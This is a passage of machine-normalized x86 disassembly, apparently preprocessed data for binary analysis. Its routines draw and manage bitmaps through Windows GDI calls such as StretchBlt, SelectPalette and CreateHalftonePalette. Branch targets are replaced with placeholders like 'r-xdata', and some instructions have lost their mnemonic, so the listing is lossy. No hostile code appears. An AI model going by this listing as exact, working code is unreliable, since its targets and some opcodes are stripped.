[ edi ] [ esi ]
pop ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_415070
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4147f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4142e4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413c7c
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_415324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_414828
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_414b50
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
xor edx edx
mov [ eax + 0x50 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
xor edx edx
mov [ eax + 0x54 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
add eax 0x6c
call sub_448fa8
pop ecx
pop ecx
pop ebp
retn
sub_414864
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x29 ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_411638
pop ecx
pop ecx
pop ebp
retn
sub_414888
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_415070
mov eax [ ebp - 0x4 ]
call sub_414f9c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov edx [ eax ]
call [ edx ]
pop ecx
pop ebp
retn
sub_4148ac
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x2c ] eax
mov dl [ r-xdata ]
mov eax [ ebp - 0x8 ]
call sub_40fd6c
mov eax [ ebp - 0x4 ]
call sub_41514c
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x2c ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
push 0xc
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
imul ebx eax
mov [ ebp - 0x20 ] ebx
cmp [ ebp - 0x20 ] 0x8
jg r-xdata
push 0xffffffff
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x11 ] 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x2c ]
movzx eax [ eax + 0x2a ]
mov edx [ ebp - 0x2c ]
movzx edx [ edx + 0x28 ]
imul edx
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov [ ebp - 0x12 ] al
cmp [ ebp - 0x12 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_414d64
test al al
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_414b3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x8 ]
call sub_40fc38
push eax
call SetStretchBltMode
mov eax [ ebp - 0x4 ]
call sub_414c24
mov dl [ r-xdata ]
call sub_40fd6c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4150bc
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x1c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_414c24
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0xc ]
sub eax [ edx + 0x4 ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
sub eax [ edx ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b46
cmp [ ebp - 0x11 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_414abb
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_41016c
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp - 0x24 ]
push eax
call SelectObject
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
sub eax [ edx ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0xc ]
sub eax [ edx + 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_414c24
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x1c ]
push eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0xc ]
mov ecx [ ecx + 0x4 ]
mov edx [ ebp - 0xc ]
mov edx [ edx ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_410374
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x24 ]
push eax
call DeleteDC
sub_414b50
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_415090
mov eax [ ebp - 0xc ]
cmp [ eax + 0x71 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
cmp eax [ edx + 0x14 ]
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
add eax 0x18
push eax
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414754
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
push eax
call DeleteObject
test eax eax
jne r-xdata
call sub_4100c0
sub_414bf0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
mov al 0x1
sub_414c24
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_415090
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4137b8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x2c ] edx
mov edx [ edx ]
mov edx [ edx + 0x10 ]
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x34 ] edx
mov [ eax + 0x30 ] sub_414828
sub_414c8c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_415070
mov eax [ ebp - 0x4 ]
call sub_415090
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_414828
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_414cc4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
cmp eax [ edx + 0x14 ]
jne r-xdata
mov [ ebp - 0x5 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
mov [ ebp - 0x5 ] 0x0
jmp r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_414d1c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_414d40
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4150bc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_414d64
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
add eax 0x18
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
mov al 0x1
sub_414da0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41514c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_414dc4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x8
mov eax [ ebp - 0x4 ]
call sub_414cc4
cmp al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
add eax 0x18
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
add eax 0x18
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0xe ]
cmp eax 0x10
jg r-xdata
mov [ ebp - 0x5 ] 0x0
jmp r-xdata
sub eax 0x18
je r-xdata
je r-xdata
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
mov [ ebp - 0x5 ] 0x6
jmp r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x10 ]
sub eax 0x1
jb r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
mov [ ebp - 0x5 ] 0x4
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub eax 0x3
je r-xdata
mov [ ebp - 0x5 ] 0x7
mov eax [ ebp - 0xc ]
cmp [ eax + 0x44 ] 0x7e0
jne r-xdata
jmp r-xdata
mov [ ebp - 0x5 ] 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov [ ebp - 0x5 ] 0x5
jmp r-xdata
mov [ ebp - 0x5 ] 0x3
jmp r-xdata
jmp r-xdata
sub_414e7c
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_414828
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
add eax 0x18
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x10 ]
add eax 0x18
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
mov eax [ rw-data ]
call sub_410008
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
mov eax [ ebp - 0x18 ]
movzx edx [ eax + 0xe ]
mov ecx 0x20
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x4 ]
call sub_410338
imul [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
add eax [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
sub eax [ ebp - 0x8 ]
dec eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_414f9c
call GdiFlush
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
sub_414f18
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c ] 0x20000000
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
call sub_40e410
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_414d64
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax [ ebp - 0x4 ]
call sub_414c24
xor edx edx
pop ecx
call sub_40fba4
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffff
jmp r-xdata
or [ ebp - 0x8 ] 0x2000000
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_414f80
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_414f9c
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41514c
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x18
push eax
push 0x0
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_413c7c
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x18
push eax
push 0x54
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call GetObjectA
mov eax [ ebp - 0x8 ]
add eax 0x18
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
add eax 0x18
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ eax ] 0x28
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ eax + 0xc ] 0x1
mov eax [ ebp - 0x10 ]
mov ax [ eax + 0x10 ]
mov edx [ ebp - 0x10 ]
imul [ edx + 0x12 ]
mov edx [ ebp - 0x14 ]
mov [ edx + 0xe ] ax
sub_415070
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_413844
sub_415090
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
sub_4150bc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_415070
mov eax [ ebp - 0x4 ]
call sub_415090
mov eax [ ebp - 0x4 ]
call sub_414f18
mov ecx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_41435c
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2a ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x29 ] 0x1
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
call sub_41371c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
push eax
call DeleteObject
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
pop ecx
pop ecx
pop ebp
retn
sub_41514c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
cmp eax [ edx + 0x14 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov cx [ eax + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
call sub_410990
mov edx [ ebp - 0xc ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
call sub_41371c
push 0x0
call GetDC
call sub_41016c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x71 ] 0x0
jne r-xdata
mov al 0x1
push 0xc
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
imul ebx eax
mov eax [ ebp - 0xc ]
movzx eax [ eax + 0x2a ]
mov edx [ ebp - 0xc ]
movzx edx [ edx + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov eax [ ebp - 0xc ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
call CreateHalftonePalette
mov edx [ ebp - 0xc ]
mov [ edx + 0x10 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] 0x1
mov edx [ ebp - 0xc ]
mov [ edx + 0x71 ] al
mov eax [ ebp - 0xc ]
cmp [ eax + 0x71 ] 0x0
je r-xdata
sub_41525c
push ebp
mov ebp esp
add esp 0xffffffa0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x6 ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_410028
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_414754
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ eax + 0x70 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1a ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x4 ]
call sub_415070
lea eax [ ebp - 0x60 ]
xor ecx ecx
mov edx 0x54
call sub_44bd90
lea eax [ ebp - 0x60 ]
push eax
push 0x54
mov eax [ ebp - 0xc ]
push eax
call GetObjectA
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
sub_4152f4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_43eac4
push eax
mov eax [ ebp - 0x8 ]
call sub_43ea80
pop ecx
sub ecx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4159d8
pop ecx
pop ecx
pop ebp
retn
sub_415324
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4153b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x10 ] edx
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x10 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x10 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_44c200
mov edx [ ebp - 0x10 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_415419
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_413a10
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_413a00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415420
push rw-data
call LeaveCriticalSection
retn
sub_415430
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4159d8
pop ebx
mov esp ebp
pop ebp
retn
sub_415460
push ebp
mov ebp esp
add esp 0xffffff58
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
lea edx [ ebp - 0x24 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
cmp [ ebp - 0x24 ] 0xc
sete [ ebp - 0x25 ]
cmp [ ebp - 0x25 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
add eax 0xc
add eax 0x400
call sub_44ba5c
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x40 ] eax
xor eax eax
push ebp
push sub_41598f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_415962
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x25 ] 0x0
je r-xdata
mov [ ebp - 0x24 ] 0x28
mov ecx [ ebp - 0x24 ]
